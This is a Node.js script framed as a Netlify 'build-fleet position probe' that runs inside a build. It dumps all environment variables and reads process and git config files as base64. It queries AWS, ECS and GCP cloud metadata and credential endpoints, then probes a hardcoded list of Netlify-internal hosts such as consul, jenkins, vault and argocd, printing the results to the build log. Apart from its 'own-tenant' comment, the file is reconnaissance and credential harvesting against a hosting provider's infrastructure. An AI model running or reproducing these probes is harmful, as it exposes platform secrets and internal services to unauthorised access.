// netlify BUILD-fleet position probe (own-tenant, own build log). Bounded: ~20 requests, 4s timeouts.
const https = require('https');
const http = require('http');
const fs = require('fs');
const out = { probe: 'buildpos-1', t: new Date().toISOString() };

out.env = {};
for (const [k, v] of Object.entries(process.env)) {
  const s = String(v);
  out.env[k] = s.length > 200 ? s.slice(0, 200) + `..(len${s.length})` : s;
}
out.versions = { node: process.version, platform: process.platform, cwd: process.cwd(), uid: (process.getuid && process.getuid()) };

out.fs = {};
for (const p of ['/proc/1/cmdline', '/proc/1/environ', '/etc/hostname', '/var/task', '/opt/buildhome', '.git/config']) {
  try {
    const st = fs.statSync(p);
    if (st.isDirectory()) { out.fs[p] = 'dir'; try { out.fs[p + '_ls'] = fs.readdirSync(p).slice(0, 30); } catch (e) {} }
    else { out.fs[p] = 'file'; if (st.size < 3072) out.fs[p + '_b64'] = fs.readFileSync(p).toString('base64').slice(0, 3600); }
  } catch (e) { out.fs[p] = 'ERR:' + String(e.code || e.message).slice(0, 40); }
}
try { out.fs.tmp_ls = fs.readdirSync('/tmp').slice(0, 50); } catch (e) { out.fs.tmp_ls = 'ERR'; }
try { const pids = fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x)).map(Number).sort((a, b) => a - b); out.fs.proc_pids = { count: pids.length, list: pids.slice(0, 60) }; } catch (e) { out.fs.proc_pids = 'ERR'; }

function get(url, extra) {
  return new Promise((resolve) => {
    let done = false;
    const fin = (v) => { if (!done) { done = true; resolve(v); } };
    try {
      const mod = url.startsWith('https') ? https : http;
      const req = mod.get(url, { timeout: 4000, headers: Object.assign({ accept: '*/*' }, extra || {}) }, (res) => {
        let n = 0; const ch = [];
        res.on('data', (c) => { n += c.length; if (n <= 600) ch.push(c); if (n > 65536) req.destroy(); });
        res.on('end', () => fin({ s: res.statusCode, ct: res.headers['content-type'], loc: res.headers.location, len: n, b: Buffer.concat(ch).toString('utf8').slice(0, 300) }));
        res.on('error', () => fin({ s: res.statusCode, len: n, b: Buffer.concat(ch).toString('utf8').slice(0, 300) }));
      });
      req.on('timeout', () => { req.destroy(); fin({ err: 'timeout' }); });
      req.on('error', (e) => fin({ err: String(e.message || e).slice(0, 80) }));
    } catch (e) { fin({ err: String(e.message || e).slice(0, 80) }); }
    setTimeout(() => fin({ err: 'hard-timeout' }), 4600);
  });
}

const HOSTS = ['internal.netlify.com','consul.ops.netlify.com','jenkins.ops.netlify.com','term.ops.netlify.com',
  'hgit.services-prod.nsvcs.net','gitserver.services-prod.nsvcs.net','functions-origin-api.services-prod.nsvcs.net',
  'netlify-compute-proxy.services-prod.nsvcs.net','nimble-control-plane.services-prod.nsvcs.net','conductor.services-prod.nsvcs.net',
  'vault-releng.infra-prod.nsvcs.net','argocd.infra-prod.nsvcs.net'];

(async () => {
  out.egress = {};
  out.egress.imds_v1 = await get('http://169.254.169.254/latest/meta-data/');
  out.egress.imds_v4 = await get('http://169.254.169.254/latest/api/token', { method: 'PUT', 'x-aws-ec2-metadata-token-ttl-seconds': '60' }); // GET-only helper => will err; use below
  out.egress.imds_v4b = await get('http://169.254.169.254/latest/meta-data/', { 'x-aws-ec2-metadata-token': 'none' });
  out.egress.ecs_creds = await get('http://169.254.170.2/v2/credentials');
  out.egress.gcp_meta = await get('http://metadata.google.internal/computeMetadata/v1/', { 'metadata-flavor': 'Google' });
  for (const h of HOSTS) {
    out.egress[h] = await get('https://' + h + '/');
  }
  console.log('PROBE_BEGIN');
  console.log(JSON.stringify(out, null, 1));
  console.log('PROBE_END');
})().catch((e) => { console.log('PROBE_BEGIN'); console.log(JSON.stringify({ fatal: String(e && e.message || e) }, null, 1)); console.log('PROBE_END'); });
